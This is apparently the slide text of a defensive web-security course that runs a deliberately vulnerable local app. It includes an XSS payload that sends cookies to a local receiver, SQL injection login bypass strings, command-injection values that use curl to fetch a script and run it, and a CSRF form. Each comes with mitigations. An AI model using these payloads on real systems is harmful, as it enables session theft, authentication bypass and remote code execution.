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</p:sldIdLst>
  <p:notesMasterIdLst>
    <p:notesMasterId r:id="rId10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notesMaster" Target="notesMasters/notesMaster1.xml"/><Relationship Id="rId108" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/presProps" Target="presProps.xml"/><Relationship Id="rId109" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/viewProps" Target="viewProps.xml"/><Relationship Id="rId110" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId1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Application Security Implementation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experiments for seeing where web application boundaries break.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Observe vulnerability behavior in a local environment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Connect each observation to a defensive implementation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Break down countermeasures from attacker, developer, and operator perspectives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Repository: https://github.com/koide55/webapp-security-programming-handson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We Need Experiments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Know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Understand what kinds of input and requests attackers use.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Observe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Watch the moment dangerous boundaries break in Cookie, HTML, SQL, and shell contexts.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Prevent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Understand the difference between "working code" and "safe code" at implementation level.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exercise is for defensive learning only. Do not use it on public servers or third-party services.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Application Security Programming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Observe common web application vulnerabilities in a local environment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Inspect the implementation boundaries where attacks become possible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Connect observed behavior to design, implementation, and operational mitigations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Course repository: https://github.com/koide55/webapp-security-programming-handson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Server Security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Understand what kinds of input and requests attackers use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Learn dangerous context boundaries: Cookie, HTML, SQL, and shell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a local training app to move between vulnerability observation and mitigation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exercise is for defensive learning only; do not use it on public servers or third-party services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Preparation: VS Code and Terminal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standard beginner editor for this course is Visual Studio Code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Install Microsoft's Python extension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Open the repository with File &gt; Open Folder...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 commands from Terminal &gt; New Terminal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After setup, choose .venv when VS Code asks for the Python interpreter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Experienced participants may use their preferred editor, but instructor demos assume VS Code.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App Lab Environment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Bottle: lightweight web framework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Peewee: ORM for Python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SQLite: local SQL database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Helper server: local XSS, CSRF, and dummy-payload experiments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Clone from GitHub and run with a Python virtual environment or Docker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App Lab Environment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Bottle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Lightweight web framework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http://bottlepy.org/docs/dev/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Peewee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ORM for Python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http://docs.peewee-orm.com/en/latest/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 database engine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use only these tools to build a lab for web application vulnerability experiments.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Frameworks We Use Here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Bottle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Lightweight web application framework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http://bottlepy.org/docs/dev/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Peewee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ORM mapper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http://docs.peewee-orm.com/en/latest/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 database engine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use these frameworks and tools to build an experimental system for learning web application vulnerabilities.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Frameworks We Use Here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Bottle handles routing, forms, cookies, and HTTP responses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Peewee maps Python models to SQLite tables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SQLite stores users, sessions, and BBS comments in a local file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helper server is used only for local XSS, CSRF, and command-injection labs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All experiments run on localhost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1: Try Bottle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Clone the repository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Install dependencies in a Python virtual environment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the vulnerable training app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Open http://localhost:8086/hello/security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Find @get("/hello/&lt;name&gt;") in app/main.py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Point: a URL path parameter is passed into a Python function and rendered as HTML.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1: Original Bottle Code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320952"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4153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1083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from bottle import *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@route('/hello/&lt;name&gt;')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index(name):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template('&lt;b&gt;Hello, {{name}}&lt;/b&gt; !', name=name)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run(host='0.0.0.0', port=8089)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948584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URL part &lt;name&gt; becomes a Python function argument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template(..., name=name) passes the value into HTML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 the current app, this corresponds to @get("/hello/&lt;name&gt;")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1: Run the App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058875"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 518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8211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https://github.com/koide55/webapp-security-programming-handson.git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webapp-security-programming-handson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python3 -m venv .venv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 .venv/bin/activate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pip install -r requirements.txt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app/main.py --reset-db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749808" y="2686507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Open http://localhost:8086/hello/security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Check the route and return value in app/main.py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1: Bottle Walkthrough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0976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Start Python and enter the Bottle sample code.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Open the URL in a browser and confirm the response.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annotations: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GET request such as /hello/something invokes the routed method.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template creates the HTML returned to the browser.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run(host='0.0.0.0', port=8089) starts the server loop.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Entering a URL in the browser triggers the route and returns the result.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 1: Try Bottle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Python and input the sample code.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When a GET /hello/something request is sent, the next method is executed.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template creates the HTML returned to the browser.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web server main loop waits for requests.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Enter a URL in the browser.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Confirm that the response is returned.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Try Peewee and SQLite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Users and Comments models define database tables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initialize_database() creates the tables and inserts seed users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app stores data in app/data.db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Seed accounts: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koide / password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alice / alice123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bob / bob123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Original Peewee Code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2202485"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 249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19647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from peewee import *</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="840" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pP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 = SqliteDatabase('data.db')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="840" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pP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class Users(Model):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username = CharField()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password = CharField()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class Meta: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database = db</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="840" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pP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db.connect()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db.create_tables([Users])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Users(username='koide', password='abcd').save()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Users(username='hirosk', password='1234').save()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749808" y="3830117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SqliteDatabase('data.db') opens a SQLite file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Users(Model) maps a Python class to a database table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current app adds userid, cookie, and Comments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Inspect SQLite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160983"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4726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92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sqlite3 app/data.db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.tables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.schema users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.schema comments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select userid, username, password, cookie from users;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.quit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788615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Compare model definitions with table definitions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Notice that passwords are stored in plain text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Separate "working implementation" from "safe implementation"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Database Operations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Peewee query example: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Users.get_or_none(Users.username == "koide")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SQLite direct query example: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select * from users where username='koide';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Compare ORM-generated access with hand-written SQL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difference becomes important in the SQL injection exercise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Database Checkpoints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Users stores users, passwords, and cookie-related values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Comments stores BBS comments and authors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ForeignKeyField connects comments to users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Discussion: explain which data should be stored and which data should not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Insert Data with Peewee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 in the original exercise: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Write the model code.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Run python3.5 main.py.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Create a database instance.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Connect to the database.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Create tables corresponding to models.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Create two user records and store them.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current app, the same idea is handled by initialize_database().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 2: Try Peewee and SQLite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0976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exercise flow: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Input code that inserts data.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Execute the script.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Create a database model.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Connect to the database.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Create tables corresponding to the model.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Create two sets of data and store them.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Create an instance of the database.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 2: Direct Database Access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continuation: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Access the database directly.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Search data.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Create a database instance.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Define a model that maps a class to a table.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Connect to the database.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Look up a record whose username is hirosk.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2: Direct Database Checkpoints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SQLite command-line tool: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Check which tables are defined.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Display all rows in the users table.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Compare what the app model says with what SQLite actually stores.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Notice that the database does not know whether a stored password is safe.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Hijacking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 does not remember the user across requests by itself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Login state is managed with cookies and server-side information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a cookie is stolen, another browser may impersonate the user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chapter observes what cookies do and how to protect them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Review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251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The browser sends an HTTP request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web server returns an HTTP response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The browser interprets HTML and displays the page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observe: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URL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 method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Form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Cookie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Response body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Is Stateless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first request and the second request are separate by default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Even after login, the server needs information to know whether it is the same user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Cookie-based session management is the common mechanism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Mistakes in session management can lead to impersonation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and the Memory-Loss Problem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 is stateless: every request is independent.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password check on one page does not automatically identify the same user on later pages.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Web apps must build a stateful experience on top of stateless HTTP.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Cookies are the common bridge between stateless requests and login state.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challenge: remember the user safely without trusting easily forged data.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Review: Same Person Not Guaranteed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browser sends an HTTP request.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server returns an HTTP response.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Another page request is a new interaction.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Without a session mechanism, the server cannot assume it is the same user.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if a password was correct once, later pages need a reliable way to identify the user.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Stateless and Stateful Example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Stateless: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Each request stands alone.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does not remember past requests automatically.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Stateful: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Past context affects the current response.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Examples: login state, carts, posted content, user preferences.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http://yohei-y.blogspot.jp/2007/10/blog-post.html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Cookie (Session Management)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After authentication succeeds, create and store a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Attach the session ID to the HTTP response header.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The browser stores the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On later requests, the browser attaches the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The server compares the received session ID with the server-managed value.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values match, the server treats it as the same user.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Cookie (Session Management)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Authentication alone is not enough for later requests.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session ID connects later requests to the authenticated user.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automatically sends the cookie to the same site.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must decide whether the session ID is valid.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session ID becomes sensitive authentication material.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Hijacking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user logs in and receives a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stores the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an attacker learns the session ID, the attacker can send it too.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may welcome the attacker as the original user.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theft can bypass password authentication after login.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Hijacking: If the ID Is Known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password was correct once, so the server registered a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Later requests identify the user by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someone else can obtain that ID, the server may not distinguish them.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exercise shows this by copying cookie values between browsers.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should the server and browser do to reduce the damage?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Stateless and Stateful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Stateless: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Each request is processed independently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is the basic nature of HTTP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Stateful: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Past state affects current processing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Examples: login state, shopping carts, author identity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Web apps build stateful experiences on top of stateless HTTP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Cookie and Session Management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After login, the server issues a session-related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sends the cookie with later requests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uses the cookie value to find the logged-in user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the cookie is predictable, stolen, or poorly protected, the session can be abused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Cookies Must Protect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Session IDs must be sufficiently random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Add cookie attributes when appropriate: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HttpOnly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Secure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SameSite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Manage expiration and logout on the server side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material intentionally includes weak behavior so the differences are visible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Hijacking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user logs in and receives a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An attacker obtains the cookie value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attacker sends requests with the stolen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the server accepts it, the attacker is treated as the victim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idea: password authentication can be bypassed after the session is stolen.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Hijacking: Exercise Focus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cookie after successful login becomes proof of identity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Copying the cookie can reproduce login state in another browser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Predictable cookie values, JavaScript-readable cookies, and weak leakage response are dangerous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exercise uses the app's Cookie page so students do not need browser developer tools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Cookie and Session Management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flow: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The user logs in with ID and password.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server generates a session ID and returns it as a cookie.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Later requests include the cookie automatically.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The server uses the cookie to decide who the user is.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Insight: if the cookie can be copied, the system may treat the copier as the user.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Observation 1: Session Hijacking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Normal user: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Sends a request with the correct cookie.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Receives a personalized response.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Attacker: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Sets and sends a stolen cookie.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trusts the cookie and welcomes the attacker as the original user.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JavaScript-readable cookies and predictable session IDs can be critical risks.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 Web App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251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features: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Sign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Login and logout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MyPage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BBS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Contact form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teaching code is in GitHub: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https://github.com/koide55/webapp-security-programming-handson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773631"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3093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15358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app/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main.py          # vulnerable training app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views/bbs.tpl   # BBS template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tools/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attacker_server.py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docs/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setup.en.md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exercises.en.md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security-notes.en.md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slides/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webapp-security-programming-handson-2026-en.pptx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749808" y="3401263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repository includes the app, helper server, setup guide, and exercises.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 the Code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app/main.py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Routes, database operations, cookies, and intentionally vulnerable logic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app/views/bbs.tpl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BBS HTML template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tools/attacker_server.py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XSS receiver, CSRF page, and dummy payload distributor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Student instructions and instructor notes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 Configuration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480922"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3705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12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DBFILE = BASE_DIR / "data.db"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 = SqliteDatabase(str(DBFILE))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class Users(BaseModel):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userid = PrimaryKeyField()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username = CharField(null=True, unique=True)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password = CharField(null=True)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cookie = CharField(null=True)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3108554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SQLite file is app/data.db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--reset-db initializes it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Sign Up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251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flow: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Receive username and password from the form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Check empty values and duplicate usernames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Save with Users.create()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Send the user to the login page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points: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current app stores passwords in plain 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fix task considers password hashing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the SQL injection exercise, the login implementation is intentionally vulnerable.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681076"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8055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44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 = "SELECT * FROM users WHERE username='" + username + \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"' and password='" + password + "';"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records = cursor.execute(sql)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729332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On success, the app issues a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executed SQL is displayed so students can observe dangerous concatenation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Logout and MyPage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251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/logout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Deletes cookie_id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Returns to the login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/mypage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Finds the current user from the cookie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Asks for login if no user is found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What is dangerous when the app relies only on cookie values?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Where should session invalidation be managed?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3: Session Hijacking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Log in as koide in a normal window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Log in as alice in another browser or incognito window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Open http://localhost:8086/cookies in each window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Copy the cookie and reload the other window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Observe how the displayed user changes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understand that cookies represent login state.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 Cookies in the Web App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6614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Log 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Open Cookie in the navigation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Look at Cookie header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Look at how cookie_id is shown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Compare values from different browsers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 to check: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cookie_id stored in the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value the app uses after signature verification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corresponding user in the DB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3 Advanced: Compare Signed Cookies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these lines in app/main.py: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response.set_cookie("cookie_id", cookie_id, secret=COOKIE_SECRET)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request.get_cookie("cookie_id", secret=COOKIE_SECRET)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642616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With secret, can you simply rewrite the cookie to user1?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What changes if secret is removed?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What do HttpOnly and SameSite protect?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XSS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string posted to BBS is displayed as HTML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escaping is disabled, JavaScript inside a post can execute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JavaScript can read cookies, it may send them elsewhere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helper server gives us a local destination for the experiment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BBS 1/3: Routing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001014"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 548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7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@get("/bbs")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bbs_form():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 = current_user()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comments = Comments.select().order_by(Comments.commentid)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template("bbs", username=user.username, comments=comments)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628646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Get the logged-in user from the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Get comments from the database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Pass username and comments to the template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BBS 2/3: Posting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160983"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4726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92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@post("/bbs")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post_bbs():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user = current_user()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comment = request.forms.decode().get("comment", "")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Comments.create(user=user, comment=comment, datetime=now)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redirect("/bbs")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788615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Save form input to the DB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At this point the value is not HTML yet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dangerous context appears when the value is displayed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BBS 3/3: Display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{{!comment.comment}}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221992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! disables escaping in Bottle templates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 input is interpreted as HTML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is intentionally left for the XSS exercise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Safer direction:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1480" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="722376" y="3551936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3716528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{{comment.comment}}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="940" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9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 / 105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Scripting Attack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victim opens a trusted web page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trusted page includes attacker-controlled script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runs the script in the trusted page context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Cookies, page content, and actions may be abused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Important: the script runs because the trusted site reflected or stored unsafe input.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Scripting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Attacker-controlled script is mixed into a site the user trusts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runs it as that site's script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Cookies or on-screen information may be read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root cause is not merely "input"; it is the output context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Observation 2: Cross-Site Scripting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Input: a comment contains &lt;script&gt;....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Storage: the app saves the comment without neutralizing it.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Execution: the victim's browser renders the stored comment as HTML.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Helper server: the script sends cookie data to a local receiver.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cause: output escaping was skipped, so data became executable code.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Scripting Attack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user often visits a trusted web site.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An attacker prepares a malicious site or payload.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malicious script is stored or reflected by the trusted site.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Private information or actions may be sent to the attacker's site.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browser executes the script in the trusted site's context.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Scripting Attack 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Trusted site: the place the user expects to be safe.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Attacker-controlled script: the code mixed into the page.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Victim browser: executes the script.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Leakage: cookies, page content, or actions may be abused.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Defensive focus: escape output for the correct context and reduce cookie exposure.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Inspect the HTML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the BBS output.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Normal strings are displayed as text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posted &lt;script&gt; is interpreted as a tag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{{!comment.comment}} allows dangerous output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Should the app delete content on input, or escape it on output?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Are the mitigations the same for HTML, attributes, and JavaScript?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Local Helper Server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 .venv/bin/activate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tools/attacker_server.py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221992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http://localhost:8090/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Receives cookie strings and displays logs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http://localhost:8090/csrf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CSRF exercise page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http://localhost:8090/badscript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Harmless dummy payload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Simple Local Helper Site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 tools/attacker_server.py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http://localhost:8090/?cookie_id=... as the XSS destination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Received values are recorded in stolen_cookies.log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This helper is for local classroom experiments only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Reference: Delete Extra Comments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the XSS exercise, you can delete posts directly from the DB.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sqlite3 app/data.db \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"delete from comments where comment like '&lt;script&gt;%';"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642616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initialize the DB:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1480" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="722376" y="3063240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227832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app/main.py --reset-db --init-only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 / 105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4: XSS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Log in to the web app and open BBS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Start the helper server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Post this comment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2281123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45715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&lt;script&gt;document.location="http://localhost:8090/?cookie_id="+document.cookie&lt;/script&gt;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749808" y="3085795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Check received values at http://localhost:8090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Explain why the cookie was readable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4 Advanced: Explain XSS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0976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and explain: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role of the helper server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role of SQLite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dangerous point in the BBS template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role of cookie attributes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meaning of output escaping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Summarize in a table: root cause, observed behavior, mitigation.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CSRF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automatically attaches cookies to requests for the target site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form on another site can still POST to the target site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the server does not verify the action came from the legitimate page, unintended actions can succeed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We observe this with BBS posting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66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Request Forgery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The user is logged in to BBS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same browser opens another site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The other site submits a POST form to BBS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The browser automatically attaches the BBS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If BBS does not verify the request, the post succeeds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Mitigations: CSRF tokens, Origin/Referer checks, SameSite cookies.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Observation 3: Cross-Site Request Forgery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behavior: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malicious page opened in another tab can trigger a POST to BBS.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automatically attaches cookies for the target site.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receives a request that looks authenticated.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Mitigation: verify that the request really came from a legitimate page using an unpredictable token.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Request Forgery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stores the session ID.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user is lured to a malicious page.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malicious page contains a form or script that submits to the legitimate site.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browser automatically sends the legitimate site's cookie.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If the server does not verify the source, the action succeeds.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Helper Server: CSRF Page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/csrf in tools/attacker_server.py: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1480922"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3705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12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@get("/csrf")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csrf_page():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page("CSRF Demo", """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&lt;form action="http://localhost:8086/bbs" method="post"&gt;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&lt;input type="hidden" name="comment" value="[CSRF] ..."&gt;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&lt;button type="submit"&gt;Submit&lt;/button&gt;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&lt;/form&gt;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""")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CSRF Page HTML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915924"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5990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67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&lt;form action="http://localhost:8086/bbs" method="post"&gt;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&lt;input type="hidden" name="token" value="a73+f*&amp;t5"&gt;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&lt;input type="hidden" name="comment" value="[CSRF] Posted from helper site"&gt;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&lt;button type="submit"&gt;Submit&lt;/button&gt;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&lt;/form&gt;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749808" y="2543556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fixed token is not a defense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server must verify an unpredictable token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5: CSRF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Start the web app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Start the helper server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Stay logged in to BBS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Open http://localhost:8090/csrf in the same browser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Press the button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Check BBS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Discussion: why was the cookie sent even though the post came from another site?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Injection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Start from safe ORM usage, then observe dangerous string-concatenated SQL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 input is interpreted as part of the SQL statement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On the login page, compare input values with the executed SQL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Connect the observation to a placeholder-based fix task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73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Observation 4: SQL Injection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attack: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 username='' or 'a'='a';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642616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'a'='a' is always true.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password check logic is broken.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Data changed the structure of the SQL query.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Insight: developer-intended logic can be rewritten by simple data when boundaries are not protected.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74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Deliberately Vulnerable Design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251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Safer directions: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ORM condition expressions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placeholders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Separate input values from SQL structure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Dangerous direction for the exercise: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Build SQL strings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Concatenate user input directly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Display errors or executed SQL for observation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Make Login Vulnerable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160983"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4726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92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username = request.forms.decode().get("username", "")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password = request.forms.decode().get("password", "")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sql = "SELECT * FROM users WHERE username='" + username + \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"' and password='" + password + "';"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records = cursor.execute(sql)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788615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Input can break SQL syntax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app/main.py keeps this implementation for the exercise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6: SQL Injection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these on the login page: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1001014"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 548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7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username: koide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password: ' or 'a'='a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username: koide' --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password: anything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3049270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executed SQL shown on screen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Why authentication succeeded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What changes when placeholders are used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77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Command Injection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contact form intentionally uses a dangerous shell call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 input is interpreted as part of an OS command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exercise uses only harmless file creation and dummy payloads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Real applications should use dedicated libraries instead of os.system()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Observation 5: Command Injection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boundary break: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echo 'message' &gt;&gt; mail.txt ; curl -s http://localhost:8090/badscript -o bad.py ; python3 bad.py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749808" y="2642616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; ends the intended command and starts another command.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User input is interpreted as shell syntax, not as text.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attacker-controlled command runs after the original command.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79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Dangerous flow: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A user submits a web form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app concatenates the input into a shell command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The shell interprets delimiters and quotes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An unexpected command runs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Point: as with SQLi and XSS, data is interpreted as code.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Boundary Between Data and Commands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251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 of dangerous characters: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|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&amp;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#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are not just text for the shell. They have syntax meaning.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Mitigation: avoid the shell, pass arguments as arrays, and use dedicated APIs.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Safer Implementation Thinking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os.system("command " + user_input)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642616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Choose:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1480" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="722376" y="3063240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227832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subprocess.run(["command", user_input], shell=False)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749808" y="3867912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smtplib for email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pathlib for files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Placeholders or ORM APIs for DB operations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1480" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11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 / 105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Vulnerable Contact Form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command = f'/bin/echo "From: {address}\n{comment}" &gt;&gt; "{OUTBOX_FILE}"'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exit_code = os.system(command)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221992"/>
            <a:ext cx="10561320" cy="699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comment is interpreted by the shell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 mail library or file API should be used instead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The exercise displays the executed command so the broken boundary is visible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Dummy Payload Distribution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Helper server /badscript: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841045"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6523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603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Path("badscript_ran.txt").write_text(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"dummy payload executed\n",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encoding="utf-8",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889301"/>
            <a:ext cx="10561320" cy="46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It only creates a harmless file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It safely demonstrates a "download and execute" flow through command injection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84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Preparation Check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456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Web app: http://localhost:8086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Helper server: http://localhost:8090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Dummy payload: http://localhost:8090/badscript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to check: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app/data.db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app/mail_outbox.txt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stolen_cookies.log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badscript_ran.txt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 Command Injection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example for the contact form message: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"; /bin/echo injected &gt; command_injection_result.txt; #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2642616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using the helper server:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1480" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="722376" y="3063240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227832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"; curl -s http://localhost:8090/badscript -o downloaded_badscript.py; python3 downloaded_badscript.py; #</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="740" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="749808" y="3867912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run this outside the local exercise.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1480" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11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 / 105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Command Injection Mitigations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call a shell in the first place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build commands through string concatenation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shell=False and argument arrays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treat input as command syntax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Minimize execution and file permissions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Log execution details and detect abnormal behavior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7: Command Injection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Log in to the web app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Open /contact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Try the harmless file-creation example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Read the command displayed on screen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Refactor the implementation so it does not use os.system()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Which characters were interpreted as shell syntax?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Where should input and command be separated?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Integrated Matrix: Vulnerability Landscape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XSS: browser target; missing output escaping; defend with escaping and HttpOnly.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CSRF: browser-behavior target; missing request-origin verification; defend with tokens and SameSite.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 injection: database target; string-concatenated SQL; defend with placeholders and binding.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Command injection: OS/shell target; shell interpretation of input; defend by avoiding the shell.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 insight: the shared root cause is a boundary failure where data is interpreted as code.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Improve Visibility: UI and Security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398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Unstyled HTML can make vulnerability behavior hard to observe.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Structured UI makes inputs, errors, and navigation clearer.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Pico.css lets us improve visibility without adding a large UI framework.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Keep security logic and UI cleanup separated.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make attack observation and defensive retesting easier for students.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 Up the UI with Pico.css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Usable UI matters even in security exercises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Clear input fields, error messages, and navigation make observation easier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Pico.css instead of a large UI kit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One stylesheet on semantic HTML improves forms and tables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Pico.css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16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Start with one link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 need to memorize many class names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label, input, button, table, and nav look reasonable by default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It fits Bottle's simple templates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It keeps UI cleanup separate from security mitigations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Directory Layout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Pico.css sample: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1837944"/>
            <a:ext cx="10561320" cy="1640891"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3344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002536"/>
            <a:ext cx="10268712" cy="14031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app/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static/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app.css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main.py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views/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base.tpl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login.tpl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examples/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pico-css/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749808" y="3689147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code is in examples/pico-css/.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93 / 105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 Static File Serving to main.py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001014"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 548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7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from bottle import static_file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@get("/static/&lt;filepath:path&gt;")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static_files(filepath):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static_file(filepath, root=str(BASE_DIR / "static"))</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="940" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="749808" y="2628646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login page to a template:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1480" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="722376" y="3049270"/>
            <a:ext cx="10561320" cy="681076"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8055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3213862"/>
            <a:ext cx="10268712" cy="44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@get("/login")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 login_form():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template("login", error=None)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="940" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9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 / 105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base.tpl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1964233"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2793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172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&lt;!doctype html&gt;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&lt;html lang="en"&gt;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&lt;head&gt;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&lt;meta charset="utf-8"&gt;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&lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;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&lt;meta name="color-scheme" content="light dark"&gt;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&lt;link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@picocss/pico@2/css/pico.min.css"&gt;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&lt;link rel="stylesheet" href="/static/app.css"&gt;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&lt;title&gt;{{title or "WebApp Security"}}&lt;/title&gt;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&lt;/head&gt;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&lt;body&gt;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&lt;main class="container"&gt;{{!base}}&lt;/main&gt;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&lt;/body&gt;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&lt;/html&gt;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/ 105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login.tpl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417320"/>
            <a:ext cx="10561320" cy="2059534"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2664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81912"/>
            <a:ext cx="10268712" cy="182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% rebase("base.tpl", title="Login")</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="840" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pP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&lt;article&gt;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&lt;h1&gt;Login&lt;/h1&gt;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% if error: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&lt;p role="alert" class="notice-error"&gt;{{error}}&lt;/p&gt;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% end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&lt;form action="/login" method="post"&gt;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&lt;label&gt;Username &lt;input name="username" required&gt;&lt;/label&gt;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&lt;label&gt;Password &lt;input name="password" type="password" required&gt;&lt;/label&gt;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&lt;button type="submit"&gt;Login&lt;/button&gt;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&lt;/form&gt;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&lt;/article&gt;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749808" y="3687166"/>
            <a:ext cx="10561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Pico.css styles form elements automatically.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8: Improve the UI with Pico.css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Review the sample in examples/pico-css/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Add static/app.css and views/base.tpl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Move the login page into a template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Gradually move other pages into templates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After UI cleanup, check how SQLi, XSS, and CSRF behavior changes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In Exercise 9, implement vulnerability mitigations one by one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goal: grow a working app into material that can explain security clearly.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97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Exercise 9: Fix Tasks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 these mitigations one at a time and confirm that the attack no longer works.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Replace login SQL with placeholders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Enable HTML escaping in the BBS display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Add HttpOnly and SameSite=Lax to the cookie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Generate a CSRF token per session and verify it on POST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Remove os.system() from /contact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Store hashed passwords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Defensive Implementation: The Antidotes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SQLi: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Stop string concatenation; use placeholders or ORM conditions.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XSS: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Enable HTML escaping in template output.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Session protection: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Add cookie attributes such as HttpOnly and SameSite=Lax.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CSRF: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Generate unpredictable tokens and verify them on POST.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Command injection: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Remove OS shell calls; use APIs or argument arrays.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Deep Dive: Secure Password Storage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864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Start with a cleartext password.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Add a unique random salt.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Run a slow password hashing algorithm such as PBKDF2, Argon2, or bcrypt.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Store an encoded string that includes method, cost, salt, and hash.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Problem: if the DB leaks, cleartext storage exposes all users immediately.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Passwords as Hashes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store passwords in plain text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 not use simple SHA-256; use a salted, intentionally expensive method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 production, prefer Argon2, bcrypt, or scrypt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For this minimal exercise, hashlib.pbkdf2_hmac() can be used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Store algorithm, iteration count, salt, and digest together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login time, fetch by username and verify the submitted password with verify_password().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101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 Answers and Instructor Hints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16314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Student exercises: docs/exercises.en.md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Advanced tasks: docs/advanced-tasks.en.md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Security map: docs/security-notes.en.md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Example answers: docs/solutions.en.md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Instructor hints: docs/instructor-hints.en.md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the exercise, do not show answers immediately. Use instructor hints for gradual support.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102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Cleanup and Windows Support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33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 generated during exercises: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app/data.db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app/mail_outbox.txt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stolen_cookies.log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command_injection_result.txt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downloaded_badscript.py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badscript_ran.txt</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1480" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pP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Windows environments do not include make, so use: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22376" y="3912616"/>
